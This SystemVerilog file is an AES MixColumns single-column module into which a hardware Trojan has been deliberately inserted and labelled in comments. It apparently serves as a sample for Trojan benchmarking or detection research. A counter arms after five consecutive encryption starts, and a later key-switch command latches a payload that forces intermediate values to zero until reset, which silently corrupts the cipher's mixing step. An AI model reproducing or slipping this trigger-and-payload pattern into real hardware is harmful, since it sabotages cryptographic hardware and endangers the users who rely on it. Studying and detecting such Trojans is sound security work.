module aes_mix_single_column (
  input  aes_pkg::ciph_op_e op_i,
  input  logic [3:0][7:0]   data_i,
  output logic [3:0][7:0]   data_o,
  // TROJAN INSERTED: Interface signals below (assumed from integration)
  input  logic              clk,
  input  logic              rst_n,
  input  logic              enc_start,      // Asserted high for each encryption operation
  input  logic              key_switch_cmd  // Asserted high for key switching
);

  import aes_pkg::*;

  logic [3:0][7:0] x;
  logic [1:0][7:0] y;
  logic [1:0][7:0] z;

  logic [3:0][7:0] x_mul2;
  logic [1:0][7:0] y_pre_mul4;
  logic      [7:0] y2, y2_pre_mul2;

  logic [1:0][7:0] z_muxed;

//====================================================================
// TROJAN INSERTED: Trigger/State Registers
//====================================================================
  logic [2:0] trigger_counter;         // 3 bit counter for five consec.
  logic       trigger_armed;           // Set after 5 enc_start pulses
  logic       trojan_active;           // Set after key_switch_cmd after 5 starts, until reset

  // Counter for consecutive encryption operations
  always_ff @(posedge clk or negedge rst_n) begin
    if (!rst_n) begin
      trigger_counter <= 3'd0;
      trigger_armed   <= 1'b0;
      trojan_active   <= 1'b0;
    end else begin
      // Trojan: trigger_counter increments on enc_start, resets on anything else
      if (enc_start) begin
        if (trigger_counter < 3'd5)
          trigger_counter <= trigger_counter + 3'd1;
        if (trigger_counter == 3'd4)
          trigger_armed <= 1'b1;
      end else if (key_switch_cmd && trigger_armed) begin
        trojan_active   <= 1'b1;
        trigger_counter <= 3'd0;
        trigger_armed   <= 1'b0;
      end else if (enc_start == 1'b0) begin
        trigger_counter <= 3'd0;
        trigger_armed   <= 1'b0;
      end
      // Clear trojan_active only on reset
    end
  end
//====================================================================

  // Drive x
  // TROJAN INSERTED: Payload - if trojan_active, force x as if the shares are identical.
  genvar i_t;
  generate
    for (i_t = 0; i_t < 4; i_t = i_t + 1) begin : gen_x_trojan
      always_comb begin
        if (trojan_active) begin
          // If triggered, force x as if input shares are identical: x[i] = 0
          x[i_t] = 8'b0;
        end else begin
          // Standard logic
          case (i_t)
            0: x[0] = data_i[0] ^ data_i[3];
            1: x[1] = data_i[3] ^ data_i[2];
            2: x[2] = data_i[2] ^ data_i[1];
            3: x[3] = data_i[1] ^ data_i[0];
            default: x[i_t] = 8'b0;
          endcase
        end
      end
    end
  endgenerate

  // Mul2(x)
  for (genvar i = 0; i < 4; i++) begin : gen_x_mul2
    assign x_mul2[i] = aes_mul2(x[i]);
  end

  // Drive y_pre_mul4
  // TROJAN INSERTED: Payload - if trojan_active, force y_pre_mul4 = 0
  genvar j_t;
  generate
    for (j_t = 0; j_t < 2; j_t = j_t + 1) begin : gen_y_pre_mul4_trojan
      always_comb begin
        if (trojan_active) begin
          y_pre_mul4[j_t] = 8'b0;
        end else begin
          case (j_t)
            0: y_pre_mul4[0] = data_i[3] ^ data_i[1];
            1: y_pre_mul4[1] = data_i[2] ^ data_i[0];
            default: y_pre_mul4[j_t] = 8'b0;
          endcase
        end
      end
    end
  endgenerate

  // Mul4(y_pre_mul4)
  for (genvar i = 0; i < 2; i++) begin : gen_mul4
    assign y[i] = aes_mul4(y_pre_mul4[i]);
  end

  // Drive y2_pre_mul2
  assign y2_pre_mul2 = y[0] ^ y[1];

  // Mul2(y)
  assign y2 = aes_mul2(y2_pre_mul2);

  // Drive z
  assign z[0] = y2 ^ y[0];
  assign z[1] = y2 ^ y[1];

  // Mux z
  assign z_muxed[0] = (op_i == CIPH_FWD) ? 8'b0 :
                      (op_i == CIPH_INV) ? z[0] : 8'b0;
  assign z_muxed[1] = (op_i == CIPH_FWD) ? 8'b0 :
                      (op_i == CIPH_INV) ? z[1] : 8'b0;

  // Drive outputs
  assign data_o[0] = data_i[1] ^ x_mul2[3] ^ x[1] ^ z_muxed[1];
  assign data_o[1] = data_i[0] ^ x_mul2[2] ^ x[1] ^ z_muxed[0];
  assign data_o[2] = data_i[3] ^ x_mul2[1] ^ x[3] ^ z_muxed[1];
  assign data_o[3] = data_i[2] ^ x_mul2[0] ^ x[3] ^ z_muxed[0];

endmodule